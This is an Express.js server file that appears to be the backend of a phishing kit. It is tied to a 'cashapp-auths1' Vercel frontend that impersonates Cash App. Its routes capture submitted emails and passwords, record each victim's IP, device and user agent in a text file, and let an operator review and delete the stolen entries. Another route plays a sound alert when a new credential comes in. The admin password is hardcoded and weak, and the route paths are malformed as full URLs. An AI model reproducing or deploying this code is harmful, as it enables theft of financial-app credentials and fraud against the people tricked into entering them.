const express = require("express");
const fs = require("fs");
const cors = require("cors");
const bodyParser = require("body-parser");
const useragent = require("useragent");
const path = require("path");

const app = express();

// Use environment PORT or 5000 for local dev
const PORT = process.env.PORT || 5000;

// Use your actual Vercel frontend URL (no trailing slash)
const FRONTEND_URL = "https://cashapp-auths1.vercel.app";

app.use(
  cors({
    origin: [FRONTEND_URL, "http://localhost:3000"], // allow Vercel and local dev
    methods: ["GET", "POST", "DELETE"],
    credentials: true,
  })
);

app.use(bodyParser.json());

// Use absolute path for data.txt so it works anywhere
const dataFilePath = path.join(__dirname, "data.txt");

// 🟨 Store Email + Password in data.txt
app.post("https://node-server-js-k66j.onrender.com/api/store", (req, res) => {
  const { email, password } = req.body;
  const agent = useragent.parse(req.headers["user-agent"]);
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const timestamp = new Date().toLocaleString();

  const device = agent.device.toString().toLowerCase().includes("mobile")
    ? "Mobile"
    : "Desktop";

  const entry = `Email: ${email} | Password: ${password} | Device: ${device} | UserAgent: ${agent.toString()} | IP: ${ip} | Time: ${timestamp}\n`;

  fs.appendFile(dataFilePath, entry, (err) => {
    if (err) {
      console.error("Error saving data:", err);
      res.status(500).send("Failed to save");
    } else {
      console.log("Saved:", entry);
      res.send("Saved");
    }
  });
});

// Store all visits
let totalClicks = 0;
let lastDataLength = 0;
let alertActive = false;

// 🔐 Admin login check
app.post("https://node-server-js-k66j.onrender.com/api/admin/login", (req, res) => {
  const { username, password } = req.body;
  if (username === "admin" && password === "12345") {
    res.json({ success: true }); // Always send JSON
  } else {
    res.status(401).json({ success: false, message: "Invalid credentials" }); // Always send JSON
  }
});

// 🟨 Return data.txt contents
app.get("https://node-server-js-k66j.onrender.com/api/data", (req, res) => {
  fs.readFile(dataFilePath, "utf8", (err, data) => {
    if (err) return res.status(500).send("Error reading file");
    const lines = data.trim().split("\n").map((line, i) => ({
      id: i,
      content: line,
    }));
    res.json(lines);
  });
});

// 🟥 Delete a line from data.txt
app.delete("https://node-server-js-k66j.onrender.com/api/data/:id", (req, res) => {
  const id = parseInt(req.params.id);
  fs.readFile(dataFilePath, "utf8", (err, data) => {
    if (err) return res.status(500).send("Error reading file");
    let lines = data.trim().split("\n");
    if (id < 0 || id >= lines.length) return res.status(400).send("Invalid ID");
    lines.splice(id, 1);
    fs.writeFile(dataFilePath, lines.join("\n") + "\n", (err) => {
      if (err) return res.status(500).send("Error writing file");
      res.send("Deleted");
    });
  });
});

// 🟢 Count total clicks
app.post("https://node-server-js-k66j.onrender.com/api/click", (req, res) => {
  totalClicks++;
  const agent = useragent.parse(req.headers["user-agent"]);
  const device = agent.device.toString().toLowerCase().includes("mobile")
    ? "Mobile"
    : "Desktop";

  res.send({
    count: totalClicks,
    device,
  });
});

// 🔊 Check if there's new data (for sound alert)
app.get("https://node-server-js-k66j.onrender.com/api/check-alert", (req, res) => {
  fs.readFile(dataFilePath, "utf8", (err, data) => {
    if (err) return res.status(500).send("Error reading file");
    const lines = data.trim().split("\n").length;
    const newData = lines > lastDataLength;
    if (newData) {
      alertActive = true;
      lastDataLength = lines;
    }
    res.json({ alert: alertActive });
  });
});

// 🛑 Stop the alert sound
app.post("https://node-server-js-k66j.onrender.com/api/stop-alert", (req, res) => {
  alertActive = false;
  res.send("Stopped");
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
